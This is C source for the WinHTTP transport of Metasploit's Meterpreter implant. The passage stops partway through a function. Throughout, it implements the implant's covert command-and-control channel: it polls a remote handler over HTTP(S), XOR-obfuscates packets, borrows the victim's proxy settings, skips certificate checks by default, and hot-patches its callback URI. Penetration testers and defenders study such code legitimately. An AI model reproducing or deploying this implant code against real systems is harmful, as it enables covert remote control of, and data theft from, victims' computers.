/*!
 * @file server_transport_http.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include "../../common/config.h"
#include "server_transport_wininet.h"
#include <winhttp.h>

/*!
 * @brief Prepare a winHTTP request with the given context.
 * @param ctx Pointer to the HTTP transport context to prepare the request from.
 * @param isGet Indication of whether this request is a GET request, otherwise POST is used.
 * @param direction String representing the direction of the communications (for debug).
 * @return An Internet request handle.
 */
static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, const char *direction)
{
	HINTERNET hReq = NULL;
	DWORD flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

	if (ctx->ssl)
	{
		flags |= WINHTTP_FLAG_SECURE;
		dprintf("[%s] Setting secure flag..", direction);
	}

	vdprintf("[%s] opening request on connection %x to %S", direction, ctx->connection, ctx->uri);
	hReq = WinHttpOpenRequest(ctx->connection, isGet ? L"GET" : L"POST", ctx->uri, NULL, NULL, NULL, flags);

	if (hReq == NULL)
	{
		dprintf("[%s] Failed WinHttpOpenRequest: %d", direction, GetLastError());
		SetLastError(ERROR_NOT_FOUND);
		return NULL;
	}

	// if no proxy is set, we should look to see if we can (and should) use the system
	// proxy settings for the given user.
	if (!ctx->proxy)
	{
		if (!ctx->proxy_configured)
		{
			WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ieConfig = { 0 };
			if (WinHttpGetIEProxyConfigForCurrentUser(&ieConfig))
			{
				dprintf("[PROXY] Got IE configuration");
				dprintf("[PROXY] AutoDetect: %s", ieConfig.fAutoDetect ? "yes" : "no");
				dprintf("[PROXY] Auto URL: %S", ieConfig.lpszAutoConfigUrl);
				dprintf("[PROXY] Proxy: %S", ieConfig.lpszProxy);
				dprintf("[PROXY] Proxy Bypass: %S", ieConfig.lpszProxyBypass);

				if (ieConfig.lpszAutoConfigUrl)
				{
					WINHTTP_AUTOPROXY_OPTIONS autoProxyOpts = { 0 };
					WINHTTP_PROXY_INFO proxyInfo = { 0 };

					dprintf("[PROXY] IE config set to autodetect with URL %S", ieConfig.lpszAutoConfigUrl);

					autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT | WINHTTP_AUTOPROXY_CONFIG_URL;
					autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
					autoProxyOpts.fAutoLogonIfChallenged = TRUE;
					autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl;

					if (WinHttpGetProxyForUrl(ctx->internet, ctx->url, &autoProxyOpts, &proxyInfo))
					{
						ctx->proxy_for_url = malloc(sizeof(WINHTTP_PROXY_INFO));
						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
					}
				}
				else if (ieConfig.lpszProxy)
				{
					WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)calloc(1, sizeof(WINHTTP_PROXY_INFO));
					ctx->proxy_for_url = proxyInfo;

					dprintf("[PROXY] IE config set to proxy %S with bypass %S", ieConfig.lpszProxy, ieConfig.lpszProxyBypass);

					proxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
					proxyInfo->lpszProxy = ieConfig.lpszProxy;
					proxyInfo->lpszProxyBypass = ieConfig.lpszProxyBypass;

					// stop the cleanup code from removing these as we're using them behind the scenes and they will
					// be freed later instead.
					ieConfig.lpszProxy = NULL;
					ieConfig.lpszProxyBypass = NULL;;
				}

				if (ieConfig.lpszAutoConfigUrl)
				{
					GlobalFree(ieConfig.lpszAutoConfigUrl);
				}
				if (ieConfig.lpszProxy)
				{
					GlobalFree(ieConfig.lpszProxy);
				}
				if (ieConfig.lpszProxyBypass)
				{
					GlobalFree(ieConfig.lpszProxyBypass);
				}
			}

			// mark as "configured" so we don't attempt to do this horrible PoS mess again.
			ctx->proxy_configured = TRUE;
		}

		if (ctx->proxy_for_url &&
			!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, ctx->proxy_for_url, sizeof(WINHTTP_PROXY_INFO)))
		{
			dprintf("[%s] Unable to set proxy options: %u", GetLastError());
		}
	}
	else
	{
		if (ctx->proxy_user)
		{
			dprintf("[%s] Setting proxy username to %S", direction, ctx->proxy_user);
			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_USERNAME, ctx->proxy_user, (DWORD)(wcslen(ctx->proxy_user))));
			{
				dprintf("[%s] Failed to set username %u", direction, GetLastError());
			}
		}
		if (ctx->proxy_pass)
		{
			dprintf("[%s] Setting proxy password to %S", direction, ctx->proxy_pass);
			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, (DWORD)(wcslen(ctx->proxy_pass))));
			{
				dprintf("[%s] Failed to set password %u", direction, GetLastError());
			}
		}
	}

	if (ctx->ssl)
	{
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
			| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
		if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
		{
			dprintf("[%s] failed to set the security flags on the request", direction);
		}
	}

	return hReq;
}

/*
 * @brief Wrapper around WinHTTP-specific request handle closing functionality.
 * @param hReq HTTP request handle.
 * @return An indication of the result of sending the request.
 */
static BOOL close_request_winhttp(HANDLE hReq)
{
	return WinHttpCloseHandle(hReq);
}

/*!
 * @brief Wrapper around WinHTTP-specific response data reading functionality.
 * @param hReq HTTP request handle.
 * @param buffer Pointer to the data buffer.
 * @param bytesToRead The number of bytes to read.
 * @param bytesRead The number of bytes actually read.
 * @return An indication of the result of sending the request.
 */
static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead, LPDWORD bytesRead)
{
	return WinHttpReadData(hReq, buffer, bytesToRead, bytesRead);
}


/*!
 * @brief Wrapper around WinHTTP-specific sending functionality.
 * @param hReq HTTP request handle.
 * @param buffer Pointer to the buffer to receive the data.
 * @param size Buffer size.
 * @return An indication of the result of sending the request.
 */
static BOOL send_request_winhttp(HANDLE hReq, LPVOID buffer, DWORD size)
{
	return WinHttpSendRequest(hReq, NULL, 0, buffer, size, size, 0);
}

/*!
 * @brief Wrapper around WinHTTP-specific receiving functionality.
 * @param hReq HTTP request handle.
 * @return An indication of the result of receiving the request.
 */
static BOOL receive_response_winhttp(HANDLE hReq)
{
	return WinHttpReceiveResponse(hReq, NULL);
}

/*!
 * @brief Wrapper around WinHTTP-specific request response validation.
 * @param hReq HTTP request handle.
 * @param ctx The HTTP transport context.
 * @return An indication of the result of getting a response.
 */
static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
{
	DWORD statusCode;
	DWORD statusCodeSize = sizeof(statusCode);
	vdprintf("[PACKET RECEIVE WINHTTP] Getting the result code...");
	if (WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
	{
		vdprintf("[PACKET RECEIVE WINHTTP] Returned status code is %d", statusCode);

		// did the request succeed?
		if (statusCode != 200)
		{
			// There are a few reasons why this could fail, including proxy related stuff.
			// If we fail, we're going to fallback to WinINET and see if that works instead.
			// there could be a number of reasons for failure, but we're only going to try
			// to handle the case where proxy authentication fails. We'll indicate failure and
			// let the switchover happen for us.

			// However, we won't do this in the case where cert hash verification is turned on,
			// because we don't want to expose people to MITM if they've explicitly asked us not
			// to.
			if (ctx->cert_hash == NULL && statusCode == 407)
			{
				return ERROR_WINHTTP_CANNOT_CONNECT;
			}

			// indicate something is up.
			return ERROR_BAD_CONFIGURATION;
		}
	}

	if (ctx->cert_hash != NULL)
	{
		vdprintf("[PACKET RECEIVE WINHTTP] validating certificate hash");
		PCERT_CONTEXT pCertContext = NULL;
		DWORD dwCertContextSize = sizeof(pCertContext);

		if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
		{
			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate context: %u", GetLastError());
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}

		DWORD dwHashSize = 20;
		BYTE hash[20];
		if (!CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
		{
			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate hash: %u", GetLastError());
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}

		if (memcmp(hash, ctx->cert_hash, CERT_HASH_SIZE) != 0)
		{
			dprintf("[SERVER] Server hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
				hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
				hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);

			dprintf("[PACKET RECEIVE WINHTTP] Certificate hash doesn't match, bailing out");
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Windows-specific function to transmit a packet via HTTP(s) using winhttp _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD res = 0;
	HINTERNET hReq;
	BOOL result;
	DWORD retries = 5;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
	unsigned char *buffer;

	DWORD totalLength = packet->payloadLength + sizeof(PacketHeader);

	buffer = malloc(totalLength);
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(PacketHeader));
	memcpy(buffer + sizeof(PacketHeader), packet->payload, packet->payloadLength);

	do
	{
		hReq = ctx->create_req(ctx, FALSE, "PACKET TRANSMIT");
		if (hReq == NULL)
		{
			break;
		}

		result = ctx->send_req(hReq, buffer, totalLength);

		if (!result)
		{
			dprintf("[PACKET TRANSMIT] Failed HttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET TRANSMIT] request sent.. apparently");
	} while(0);

	memset(buffer, 0, totalLength);
	ctx->close_req(hReq);
	return res;
}

/*!
 * @brief Transmit a packet via HTTP(s) _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		dprintf("[PACKET] New xor key for sending");
		packet->header.xor_key = rand_xor_key();
		dprintf("[PACKET] XOR Encoding payload");
		// before transmission, xor the whole lot, starting with the body
		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
		dprintf("[PACKET] XOR Encoding header");
		// then the header
		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
		// be sure to switch the xor header before writing
		packet->header.xor_key = htonl(packet->header.xor_key);

		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
		res = packet_transmit_http(remote, packet, completion);
		if (res < 0)
		{
			dprintf("[PACKET] transmit failed with return %d\n", res);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Windows-specific function to receive a new packet via one of the HTTP libs (WinInet or WinHTTP).
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_http(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	PacketHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;

	lock_acquire(remote->lock);

	do
	{
		hReq = ctx->create_req(ctx, TRUE, "PACKET RECEIVE");
		if (hReq == NULL)
		{
			break;
		}

		vdprintf("[PACKET RECEIVE HTTP] sending GET");
		hRes = ctx->send_req(hReq, NULL, 0);

		if (!hRes)
		{
			dprintf("[PACKET RECEIVE HTTP] Failed send_req: %d %d", GetLastError(), WSAGetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		vdprintf("[PACKET RECEIVE HTTP] Waiting to see the response ...");
		if (ctx->receive_response && !ctx->receive_response(hReq))
		{
			vdprintf("[PACKET RECEIVE] Failed receive: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		SetLastError(ctx->validate_response(hReq, ctx));

		if (GetLastError() != ERROR_SUCCESS)
		{
			// something went wrong, so break
			break;
		}

		// Read the packet length
		retries = 3;
		vdprintf("[PACKET RECEIVE HTTP] Start looping through the receive calls");
		while (inHeader && retries > 0)
		{
			retries--;
			if (!ctx->read_response(hReq, (PUCHAR)&header + headerBytes, sizeof(PacketHeader)-headerBytes, &bytesRead))
			{
				dprintf("[PACKET RECEIVE HTTP] Failed HEADER read_response: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE NHTTP] Data received: %u bytes", bytesRead);

			// If the response contains no data, this is fine, it just means the
			// remote side had nothing to tell us. Indicate this through a
			// ERROR_EMPTY response code so we can update the timestamp.
			if (bytesRead == 0)
			{
				SetLastError(ERROR_EMPTY);
				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(PacketHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (GetLastError() == ERROR_EMPTY)
		{
			break;
		}

		if (headerBytes != sizeof(PacketHeader))
		{
			dprintf("[PACKET RECEIVE HTTP] headerBytes no valid");
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET RECEIVE HTTP] decoding header");
		header.xor_key = ntohl(header.xor_key);
		xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
		header.length = ntohl(header.length);

		// Initialize the header
		vdprintf("[PACKET RECEIVE HTTP] initialising header");
		// use TlvHeader size here, because the length doesn't include the xor byte
		payloadLength = header.length - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		retries = payloadBytesLeft;
		while (payloadBytesLeft > 0 && retries > 0)
		{
			vdprintf("[PACKET RECEIVE HTTP] reading more data from the body...");
			retries--;
			if (!ctx->read_response(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed BODY read_response: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			if (!bytesRead)
			{
				vdprintf("[PACKET RECEIVE HTTP] no bytes read, bailing out");
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE HTTP] bytes read: %u", bytesRead);
			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		dprintf("[PACKET RECEIVE HTTP] decoding payload");
		xor_bytes(header.xor_key, payload, payloadLength);

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	if (hReq)
	{
		ctx->close_req(hReq);
	}

	lock_release(remote->lock);

	return res;
}


/*!
 * @brief Initialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv (ignored);
 * @return Indication of success or failure.
 */
static BOOL server_init_winhttp(Transport* transport)
{
	URL_COMPONENTS bits;
	wchar_t tmpHostName[URL_SIZE];
	wchar_t tmpUrlPath[URL_SIZE];
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	dprintf("[WINHTTP] Initialising ...");

	// configure proxy
	if (ctx->proxy)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = URL_SIZE - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URL_SIZE - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
	WinHttpCrackUrl(transport->url, 0, 0, &bits);

	SAFE_FREE(ctx->uri);
	ctx->uri = _wcsdup(tmpUrlPath);
	transport->comms_last_packet = current_unix_timestamp();

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	return TRUE;
}

/*!
 * @brief Deinitialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_http(Transport* transport)
{
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	dprintf("[HTTP] Deinitialising ...");

	if (ctx->connection)
	{
		ctx->close_req(ctx->connection);
		ctx->connection = NULL;
	}

	if (ctx->internet)
	{
		ctx->close_req(ctx->internet);
		ctx->internet = NULL;
	}

	// have we had issues that require us to move?
	if (ctx->move_to_wininet)
	{
		// yes, so switch on over.
		transport_move_to_wininet(transport);
		ctx->move_to_wininet = FALSE;
	}

	return TRUE;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using HTTP(S).
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	while (running)
	{
		if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_http(remote, &packet);

		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_CANNOT_CONNECT)
			{
				dprintf("[DISPATCH] Failed to work correctly with WinHTTP, moving over to WinINET");
				// next we need to indicate that we need to do a switch to wininet when we terminate
				ctx->move_to_wininet = TRUE;

				// and pretend to do a transport switch, to ourselves!
				remote->next_transport = remote->transport;
				result = ERROR_SUCCESS;
				break;
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with, so we need to move
				// on to another transport.
				// If we're the only transport, then we should wait for the allotted
				// time before trying again. Otherwise, we can just switch immediately.
				// This avoids spinning the process and making way too many requests
				// in a short period of time (ie. avoiding noise).
				if (remote->transport == remote->transport->next_transport)
				{
					remote->next_transport_wait = remote->transport->timeouts.retry_wait;
				}

				break;
			}
			else if (result == ERROR_BAD_CONFIGURATION)
			{
				// something went wrong with WinINET so break.
				break;
			}

			delay = 10 * ecount;
			if (ecount >= 10)
			{
				delay *= 10;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
		}
		else
		{
			transport->comms_last_packet = current_unix_timestamp();

			// Reset the empty count when we receive a packet
			ecount = 0;

			dprintf("[DISPATCH] Returned result: %d", result);

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));

			if (ctx->new_uri != NULL)
			{
				dprintf("[DISPATCH] Recieved hot-patched URL for stageless: %S", ctx->new_uri);
				dprintf("[DISPATCH] Old URI is: %S", ctx->uri);
				dprintf("[DISPATCH] Old URL is: %S", transport->url);

				// if the new URI needs more space, let's realloc space for the new URL now
				int diff = (int)wcslen(ctx->new_uri) - (int)wcslen(ctx->uri);
				if (diff > 0)
				{
					dprintf("[DISPATCH] New URI is bigger by %d", diff);
					transport->url = (wchar_t*)realloc(transport->url, (wcslen(transport->url) + diff + 1) * sizeof(wchar_t));
				}

				// we also need to patch the new URI into the original transport URL, not just the currently
				// active URI for comms. If we don't, then migration behaves badly.
				// Start by locating the start of the URI in the current URL, by finding the third slash
				wchar_t* csr = transport->url + wcslen(transport->url) - 2;
				while (*csr != L'/')
				{
					--csr;
				}
				dprintf("[DISPATCH] Pointer is at: %p -> %S", csr, csr);

				// patch in the new URI
				wcscpy_s(csr, wcslen(diff > 0 ? ctx->new_uri : ctx->uri) + 1, ctx->new_uri);
				dprintf("[DISPATCH] New URL is: %S", transport->url);

				// clean up
				SAFE_FREE(ctx->uri);
				ctx->uri = ctx->new_uri;
				ctx->new_uri = NULL;
			}
		}
	}

	return result;
}

/*!
 * @brief Destroy the HTTP(S) transport.
 * @param transport Pointer to the HTTP(S) transport to reset.
 */
static void transport_destroy_http(Transport* transport)
{
	if (transport && transport->type != METERPRETER_TRANSPORT_SSL)
	{
		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

		dprintf("[TRANS HTTP] Destroying http transport for url %S", transport->url);

		if (ctx)
		{
			SAFE_FREE(ctx->cert_hash);
			SAFE_FREE(ctx->proxy);
			SAFE_FREE(ctx->proxy_pass);
			SAFE_FREE(ctx->proxy_user);
			SAFE_FREE(ctx->ua);
			SAFE_FREE(ctx->uri);
			if (ctx->proxy_for_url)
			{
				WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)ctx->proxy_for_url;
				if (proxyInfo->lpszProxy)
				{
					GlobalFree(proxyInfo->lpszProxy);
				}
				if (proxyInfo->lpszProxyBypass)
				{
					GlobalFree(proxyInfo->lpszProxyBypass);
				}
			}
			SAFE_FREE(ctx->proxy_for_url);
		}
		SAFE_FREE(transport->url);
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

void transport_write_http_config(Transport* transport, MetsrvTransportHttp* config)
{
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	config->common.comms_timeout = transport->timeouts.comms;
	config->common.retry_total = transport->timeouts.retry_total;
	config->common.retry_wait = transport->timeouts.retry_wait;
	wcsncpy(config->common.url, transport->url, URL_SIZE);

	if (ctx->ua)
	{
		wcsncpy(config->ua, ctx->ua, UA_SIZE);
	}

	if (ctx->cert_hash)
	{
		memcpy(config->ssl_cert_hash, ctx->cert_hash, CERT_HASH_SIZE);
	}

	if (ctx->proxy)
	{
		wcsncpy(config->proxy.hostname, ctx->proxy, PROXY_HOST_SIZE);
	}

	if (ctx->proxy_user)
	{
		wcsncpy(config->proxy.username, ctx->proxy_user, PROXY_USER_SIZE);
	}

	if (ctx->proxy_pass)
	{
		wcsncpy(config->proxy.password, ctx->proxy_pass, PROXY_PASS_SIZE);
	}
}

/*!
 * @brief Create an HTTP(S) transport from the given settings.
 * @param config Pointer to the HTTP configuration block.
 * @return Pointer to the newly configured/created HTTP(S) transport instance.
 */
Transport* transport_create_http(MetsrvTransportHttp* config)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));

	dprintf("[TRANS HTTP] Creating http transport for url %S", config->common.url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(HttpTransportContext));

	dprintf("[TRANS HTTP] Given ua: %S", config->ua);
	if (config->ua[0])
	{
		ctx->ua = _wcsdup(config->ua);
	}
	dprintf("[TRANS HTTP] Given proxy host: %S", config->proxy.hostname);
	if (config->proxy.hostname[0])
	{
		ctx->proxy = _wcsdup(config->proxy.hostname);
	}
	dprintf("[TRANS HTTP] Given proxy user: %S", config->proxy.username);
	if (config->proxy.username[0])
	{
		ctx->proxy_user = _wcsdup(config->proxy.username);
	}
	dprintf("[TRANS HTTP] Given proxy pass: %S", config->proxy.password);
	if (config->proxy.password[0])
	{
		ctx->proxy_pass = _wcsdup(config->proxy.password);
	}
	ctx->ssl = wcsncmp(config->common.url, L"https", 5) == 0;

	dprintf("[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
		config->ssl_cert_hash[0], config->ssl_cert_hash[1], config->ssl_cert_hash[2], config->ssl_cert_hash[3],
		config->ssl_cert_hash[4], config->ssl_cert_hash[5], config->ssl_cert_hash[6], config->ssl_cert_hash[7],
		config->ssl_cert_hash[8], config->ssl_cert_hash[9], config->ssl_cert_hash[10], config->ssl_cert_hash[11],
		config->ssl_cert_hash[12], config->ssl_cert_hash[13], config->ssl_cert_hash[14], config->ssl_cert_hash[15],
